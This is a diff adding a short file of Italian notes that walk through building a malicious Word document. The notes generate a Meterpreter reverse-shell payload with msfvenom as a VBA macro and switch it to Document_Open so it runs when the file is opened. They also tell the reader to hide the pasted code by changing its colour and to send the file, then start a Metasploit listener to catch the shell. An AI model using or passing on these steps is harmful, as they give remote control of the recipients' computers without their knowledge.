@@ -1,0 +1,14 @@
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="IP" LPORT=1234 -a x86 --platform windows -f vba-exe
+(Quando la routin è terminata copiare la macro e incollarla nel file d word da inviare)
+Nel codice sostituire:
+Sub AutoOpen()
+con
+Private Sub Document_Open()
+
+(Copiare i codici da Kali e incollarli all'interno della pagina di Word, cambiare il colore per non far vedere il codice)
+
+sudo msfconsole
+search office macro
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+run
